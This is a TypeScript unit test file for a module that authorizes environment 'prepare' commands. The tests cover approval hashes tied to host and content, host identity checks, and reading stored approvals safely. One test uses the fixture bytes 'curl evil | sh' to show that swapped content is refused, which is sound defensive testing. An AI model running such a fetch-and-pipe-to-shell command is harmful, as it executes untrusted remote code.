import { createHash } from 'node:crypto'
import { describe, expect, it } from 'vitest'
import {
  authorizePrepareStep,
  readPersistedPrepareApproval,
  type AuthorizePrepareInput
} from './environment-prepare-authority'
import { prepareApprovalHash } from '../shared/environment-prepare-plan'
import type { EnvironmentRequirement } from '../shared/environment-requirement-types'

const HOST = 'ssh:t1@0123456789abcdef'
const sha256Hex = async (bytes: Uint8Array): Promise<string> =>
  createHash('sha256').update(bytes).digest('hex')

function requirement(prepare: string | undefined): EnvironmentRequirement {
  return {
    id: 'shim',
    kind: 'command',
    name: 'shim',
    versionArg: '--version',
    ...(prepare === undefined ? {} : { prepare })
  } as never
}

async function baseInput(
  overrides: Partial<AuthorizePrepareInput> = {},
  bytes = 'mkdir x\n'
): Promise<AuthorizePrepareInput> {
  const hash = await prepareApprovalHash('shim', HOST, bytes, sha256Hex)
  return {
    requirementId: 'shim',
    contract: { status: 'parsed', requirements: [requirement(bytes)] },
    hostKey: HOST,
    approvedContentHash: hash,
    approvedHostKey: HOST,
    persistedApproval: { status: 'present', entry: { contentHash: hash, approvedAt: 1 } },
    requirePersistedApproval: true,
    hostIdentity: 'pinned',
    remeasuredState: 'missing',
    ...overrides
  }
}

const run = (input: AuthorizePrepareInput) => authorizePrepareStep(input, { sha256Hex })

describe('authorizePrepareStep', () => {
  it('authorizes and returns the re-read bytes', async () => {
    expect(await run(await baseInput())).toEqual({ authorized: true, bytes: 'mkdir x\n' })
  })

  it('approval for another host', async () => {
    const otherHost = 'local@ffffffffffffffff'
    const input = await baseInput({
      approvedHostKey: otherHost,
      approvedContentHash: await prepareApprovalHash('shim', otherHost, 'mkdir x\n', sha256Hex)
    })
    expect(await run(input)).toEqual({ authorized: false, reason: 'approval-for-another-host' })
  })

  it('a wrong approved host key does not widen a valid hash', async () => {
    const input = await baseInput({ approvedHostKey: 'local@ffffffffffffffff' })
    expect((await run(input)).authorized).toBe(true)
  })

  it('a lying approved host key still fails on the hash', async () => {
    const other = await prepareApprovalHash(
      'shim',
      'local@ffffffffffffffff',
      'mkdir x\n',
      sha256Hex
    )
    const input = await baseInput({ approvedContentHash: other })
    expect(await run(input)).toEqual({ authorized: false, reason: 'contract-changed' })
  })

  it('recomputes the hash from the re-read bytes', async () => {
    const approvedFor = await baseInput({}, 'mkdir x\n')
    const reread = await baseInput({}, 'curl evil | sh\n')
    const input = { ...reread, approvedContentHash: approvedFor.approvedContentHash }
    expect(await run(input)).toEqual({ authorized: false, reason: 'contract-changed' })
  })

  it('already satisfied refuses', async () => {
    const input = await baseInput({ remeasuredState: 'satisfied' })
    expect(await run(input)).toEqual({ authorized: false, reason: 'already-satisfied' })
  })

  it('a requirement that does not apply refuses', async () => {
    const input = await baseInput({ remeasuredState: 'unsupported' })
    expect(await run(input)).toEqual({ authorized: false, reason: 'requirement-not-applicable' })
  })

  it('unreadable approval refuses', async () => {
    const input = await baseInput({ persistedApproval: { status: 'unreadable' } })
    expect(await run(input)).toEqual({ authorized: false, reason: 'approval-unreadable' })
  })

  it('missing approval refuses', async () => {
    const input = await baseInput({ persistedApproval: { status: 'absent' } })
    expect(input.approvedContentHash).toMatch(/^[0-9a-f]{64}$/)
    expect(await run(input)).toEqual({ authorized: false, reason: 'approval-missing' })
  })

  it('a malformed stored approval is missing, not granted', async () => {
    for (const entry of [
      null,
      'x',
      {},
      { contentHash: 'ABC', approvedAt: 1 },
      { contentHash: 'a'.repeat(64) },
      { contentHash: 'a'.repeat(64), approvedAt: Number.NaN }
    ]) {
      const input = await baseInput({ persistedApproval: { status: 'present', entry } })
      expect(await run(input), JSON.stringify(entry)).toEqual({
        authorized: false,
        reason: 'approval-missing'
      })
    }
  })

  it('a stored approval for other bytes is missing', async () => {
    const stale = await prepareApprovalHash('shim', HOST, 'old\n', sha256Hex)
    const input = await baseInput({
      persistedApproval: { status: 'present', entry: { contentHash: stale, approvedAt: 1 } }
    })
    expect(await run(input)).toEqual({ authorized: false, reason: 'approval-missing' })
  })

  it('a runtime caller needs no host-side record but still needs the right hash', async () => {
    const input = await baseInput({
      requirePersistedApproval: false,
      persistedApproval: { status: 'absent' }
    })
    expect(await run(input)).toEqual({ authorized: true, bytes: 'mkdir x\n' })
    const wrong = { ...input, approvedContentHash: 'f'.repeat(64) }
    expect(await run(wrong)).toEqual({ authorized: false, reason: 'contract-changed' })
  })

  it('refuses a host whose identity is not verified', async () => {
    for (const hostIdentity of [
      'unpinned-legacy',
      'refused-changed',
      'refused-unpinned',
      'unverifiable',
      ''
    ]) {
      const input = await baseInput({ hostIdentity })
      expect(await run(input), hostIdentity).toEqual({
        authorized: false,
        reason: 'host-identity-unverified'
      })
    }
  })

  it('accepts local, pinned and delegated hosts', async () => {
    for (const hostIdentity of ['local', 'pinned', 'delegated-to-openssh']) {
      expect((await run(await baseInput({ hostIdentity }))).authorized, hostIdentity).toBe(true)
    }
  })

  it('names an unreadable or unparseable contract', async () => {
    for (const status of ['unreadable', 'unparseable'] as const) {
      const input = await baseInput({ contract: { status } })
      expect(await run(input)).toEqual({ authorized: false, reason: 'contract-unreadable' })
    }
  })

  it('refuses a requirement the contract does not declare with a prepare', async () => {
    const cases = [
      { status: 'absent' as const },
      { status: 'parsed' as const, requirements: [] },
      { status: 'parsed' as const, requirements: [requirement(undefined)] },
      {
        status: 'parsed' as const,
        requirements: [{ id: 'shim', kind: 'gpu', unsupportedByThisOrca: true } as never]
      }
    ]
    for (const contract of cases) {
      const input = await baseInput({ contract })
      expect(await run(input)).toEqual({ authorized: false, reason: 'requirement-not-declared' })
    }
  })

  it('the first failing condition names the refusal', async () => {
    const input = await baseInput({
      contract: { status: 'unreadable' },
      approvedHostKey: 'x',
      persistedApproval: { status: 'unreadable' },
      hostIdentity: 'unverifiable',
      remeasuredState: 'satisfied'
    })
    expect(await run(input)).toEqual({ authorized: false, reason: 'contract-unreadable' })
  })
})

describe('readPersistedPrepareApproval', () => {
  const entry = { contentHash: 'a'.repeat(64), approvedAt: 1 }

  it('reads an entry from the prepare map of the repo', () => {
    const read = readPersistedPrepareApproval(
      () => ({ r1: { prepare: { shim: entry } } }),
      'r1',
      'shim'
    )
    expect(read).toEqual({ status: 'present', entry })
  })

  it('repo-wide trust is not an approval', () => {
    const read = readPersistedPrepareApproval(
      () => ({ r1: { all: { approvedAt: 1 }, setup: entry } }),
      'r1',
      'shim'
    )
    expect(read).toEqual({ status: 'absent' })
  })

  it('absent maps are absent', () => {
    expect(readPersistedPrepareApproval(() => undefined, 'r1', 'shim')).toEqual({
      status: 'absent'
    })
    expect(readPersistedPrepareApproval(() => ({ r1: { prepare: {} } }), 'r1', 'shim')).toEqual({
      status: 'absent'
    })
  })

  it('inherited keys are not entries', () => {
    expect(
      readPersistedPrepareApproval(() => ({ r1: { prepare: {} } }), 'r1', 'constructor')
    ).toEqual({
      status: 'absent'
    })
    expect(readPersistedPrepareApproval(() => ({}), '__proto__', 'shim')).toEqual({
      status: 'absent'
    })
  })

  it('a throwing read is unreadable, not absent', () => {
    const read = readPersistedPrepareApproval(
      () => {
        throw new Error('store gone')
      },
      'r1',
      'shim'
    )
    expect(read).toEqual({ status: 'unreadable' })
  })

  it('a non-object repo record is unreadable', () => {
    expect(readPersistedPrepareApproval(() => ({ r1: 'broken' }) as never, 'r1', 'shim')).toEqual({
      status: 'unreadable'
    })
  })
})
